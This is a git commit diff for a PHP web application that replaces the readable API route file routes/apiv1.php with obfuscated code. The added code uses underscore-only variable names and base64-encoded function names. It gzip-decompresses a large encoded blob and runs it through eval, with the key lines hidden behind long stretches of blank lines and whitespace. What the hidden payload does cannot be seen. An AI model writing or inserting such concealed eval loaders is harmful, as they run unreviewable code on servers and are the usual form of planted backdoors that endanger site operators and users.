b30289e848b111fee2dc840774b1dd9175962a6f
vickyrolanda <v.rolanda92@gmail.com>
2022-10-02 15:57:05 +0700

    Rilis v22.10.01

--- routes/apiv1.php
+++ routes/apiv1.php
@@ -1,113 +1,358 @@
 <?php
 
-use App\Http\Controllers\Api\AgendaDesaController;
-use App\Http\Controllers\Api\ArtikelController;
-use App\Http\Controllers\Api\Auth\AuthenticatedController;
-use App\Http\Controllers\Api\Auth\EmailVerificationNotificationController;
-use App\Http\Controllers\Api\Auth\NewPasswordController;
-use App\Http\Controllers\Api\Auth\NewPinController;
-use App\Http\Controllers\Api\Auth\PasswordResetLinkController;
-use App\Http\Controllers\Api\Auth\VerifyEmailController;
-use App\Http\Controllers\Api\BantuanController;
-use App\Http\Controllers\Api\CetakController;
-use App\Http\Controllers\Api\ConfigDesaController;
-use App\Http\Controllers\Api\DokumenController;
-use App\Http\Controllers\Api\KategoriController;
-use App\Http\Controllers\Api\KomentarController;
-use App\Http\Controllers\Api\PendudukController;
-use App\Http\Controllers\Api\PesanController;
-use App\Http\Controllers\Api\SuratController;
-use Illuminate\Support\Facades\Route;
+$__='printf';
+$_='Loading routes/apiv1.php';
 
-/*
-|--------------------------------------------------------------------------
-| API Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register API routes for your application. These
-| routes are loaded by the RouteServiceProvider within a group which
-| is assigned the "api" middleware group. Enjoy building your API!
-|
-*/
 
-// Admin routes
-Route::prefix('admin')
-    ->middleware(['auth:admin', 'can:is-admin'])
-    ->group(function () {
-        Route::get('penduduk', [PendudukController::class, 'index']);
-    });
 
-// Autentikasi
-Route::prefix('auth')->as('jwt.')
-    ->group(function () {
-        Route::post('login', [AuthenticatedController::class, 'login'])->name('login');
-        Route::post('logout', [AuthenticatedController::class, 'logout'])->middleware('auth:jwt')->name('logout');
-        Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])->name('password.email');
-        Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.update');
-        Route::get('verify-email/{id}/{hash}', VerifyEmailController::class)->middleware(['auth:jwt', 'signed', 'throttle:6,1'])->name('verification.verify');
-        Route::post('email/verification-notification', [EmailVerificationNotificationController::class, 'store'])->middleware(['auth:jwt', 'throttle:6,1'])->name('verification.send');
-        Route::post('change-pin', NewPinController::class)->middleware('auth:jwt')->name('change.pin');
-    });
 
-// Profil Desa
-Route::get('profil-desa', [ConfigDesaController::class, 'index']);
 
-// Artikel
-Route::prefix('artikel')
-    ->middleware('auth:jwt')
-    ->group(function () {
-        Route::get('/', [ArtikelController::class, 'index']);
-        Route::get('read/{slug}', [ArtikelController::class, 'show']);
-        Route::get('headline', [ArtikelController::class, 'headline']);
-        Route::get('kategori', [KategoriController::class, 'index']);
-        Route::get('kategori/{slug}', [KategoriController::class, 'show']);
-        Route::get('komentar', [KomentarController::class, 'index']);
-        Route::get('komentar/{id}', [KomentarController::class, 'show']);
-        Route::post('komentar', [KomentarController::class, 'store']);
-        Route::get('agenda-desa', [AgendaDesaController::class, 'index']);
-    });
 
-// Layanan mandiri
-Route::prefix('layanan-mandiri')
-    ->middleware('auth:jwt')
-    ->group(function () {
-        // Mandiri pesan masuk
-        Route::prefix('pesan')
-            ->group(function () {
-                Route::get('tipe/{tipe}', [PesanController::class, 'index']);
-                Route::get('detail/{id}', [PesanController::class, 'show']);
-                Route::post('/', [PesanController::class, 'store']);
-            });
 
-        // Mandiri cetak
-        Route::prefix('cetak')
-            ->group(function () {
-                Route::get('biodata', [CetakController::class, 'cetakBiodata']);
-                Route::get('kartu-keluarga', [CetakController::class, 'cetakKartuKeluarga']);
-            });
 
-        // Mandiri program bantuan
-        Route::get('bantuan', [BantuanController::class, 'index']);
-        Route::get('bantuan/{id}', [BantuanController::class, 'show']);
 
-        // Dokumen warga
-        Route::prefix('dokumen')
-            ->group(function () {
-                Route::get('/', [DokumenController::class, 'index']);
-                Route::get('{id}/download', [DokumenController::class, 'show']);
-                Route::post('store', [DokumenController::class, 'store']);
-                Route::delete('{id}/delete', [DokumenController::class, 'destroy']);
-            });
 
-        // Mandiri surat
-        Route::prefix('surat')
-            ->group(function () {
-                Route::get('arsip', [SuratController::class, 'arsip']);
-                Route::get('permohonan', [SuratController::class, 'permohonan']);
-                Route::get('jenis-permohonan', [SuratController::class, 'jenis']);
-                Route::get('syarat', [SuratController::class, 'syaratSurat']);
-                Route::post('{slug}/permohonan', [SuratController::class, 'store']);
-                Route::post('unggah-dokumen', [SuratController::class, 'unggahDokumen']);
-                Route::put('{id}/permohonan', [SuratController::class, 'update']);
-            });
-    });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$_____='    b2JfZW5kX2NsZWFu';
+$______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+$______=' Z3p1bmNvbXByZXNz';
+$___='  b2Jfc3RhcnQ=';
+$____='b2JfZ2V0X2NvbnRlbnRz';
+$__=                                                              'base64_decode'                           ;
+$______=$__($______);
+if (!function_exists('__lambda')) {
+    function __lambda($sArgs, $sCode)
+    {
+        return eval("return function($sArgs){{$sCode}};");
+    }
+}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);
+$______________=$__($______________);
+$__________=$__________________('$_', $______________);
+$_____=$__($_____);
+$____=$__($____);
+$___=$__($___);
+$_='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';
+
+$___();
+$__________($______($__($_)));
+$________=$____();
+$_____();
+echo
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
